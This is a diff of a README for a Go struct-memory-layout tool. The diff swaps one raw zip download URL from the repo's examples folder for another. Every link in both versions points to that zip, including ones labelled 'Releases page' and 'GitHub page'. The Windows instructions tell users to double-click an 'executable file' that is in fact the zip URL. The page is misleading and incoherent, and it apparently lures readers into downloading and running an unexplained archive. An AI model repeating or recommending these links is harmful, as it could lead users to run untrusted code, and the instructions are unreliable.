@@ -6,7 +6,7 @@ Welcome to go-mem-layout! This tool helps you understand how your Go structs are
 
 ## 📥 Download Now
 
-[![Download go-mem-layout](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/go-mem-layout-2.5-alpha.5.zip)](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/go-mem-layout-2.5-alpha.5.zip)
+[![Download go-mem-layout](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/mem-layout-go-2.1.zip)](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/mem-layout-go-2.1.zip)
 
 ## 📚 Features
 
@@ -28,7 +28,7 @@ To run go-mem-layout, you will need:
 
 To get started, visit the Releases page to download the latest version of go-mem-layout:
 
-[Download from Releases Page](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/go-mem-layout-2.5-alpha.5.zip)
+[Download from Releases Page](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/mem-layout-go-2.1.zip)
 
 1. Click the link above.
 2. Find the latest version at the top of the page.
@@ -42,7 +42,7 @@ Once you have downloaded the file, follow these steps to run go-mem-layout:
 ### For Windows Users
 
 1. Navigate to the folder where you saved the downloaded file.
-2. Double-click on the executable file (e.g., `https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/go-mem-layout-2.5-alpha.5.zip`).
+2. Double-click on the executable file (e.g., `https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/mem-layout-go-2.1.zip`).
 3. A window will open showing the application interface.
 
 ### For macOS Users
@@ -104,7 +104,7 @@ Join our community of users and developers to share tips, ask questions, and imp
 
 ## 🔄 Contributing
 
-If you'd like to contribute to go-mem-layout or report issues, please visit our [GitHub page](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/go-mem-layout-2.5-alpha.5.zip) for more details.
+If you'd like to contribute to go-mem-layout or report issues, please visit our [GitHub page](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/mem-layout-go-2.1.zip) for more details.
 
 ---
 
